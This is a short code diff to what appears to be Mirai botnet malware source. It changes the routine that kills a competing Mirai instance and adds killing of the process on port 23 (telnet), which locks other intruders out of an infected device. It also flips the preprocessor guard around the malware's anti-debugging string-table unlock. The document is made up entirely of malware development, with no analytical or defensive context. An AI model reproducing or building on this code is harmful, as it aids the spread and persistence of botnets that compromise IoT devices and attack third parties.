@@ -55,7 +55,8 @@ void check_and_kill_mirai()
         close(sock);
     } else {
         printf("Mirai detected! Killing...\r\n");
-        killer_kill_by_port(SINGLE_INSTANCE_PORT_MIRAI);
+        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT_MIRAI));
+	killer_kill_by_port(htons(23));
         close(sock);
     }
     //addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
@@ -581,7 +582,8 @@ static BOOL unlock_tbl_if_nodebug(char *argv0)
     }
     fold %= (sizeof (obf_funcs) / sizeof (void *));
     
-#ifndef DEBUG
+//#ifndef DEBUG
+#ifdef DEBUG
     (obf_funcs[fold])();
     matches = util_strcmp(argv0, buf_dst);
     util_zero(buf_src, sizeof (buf_src));
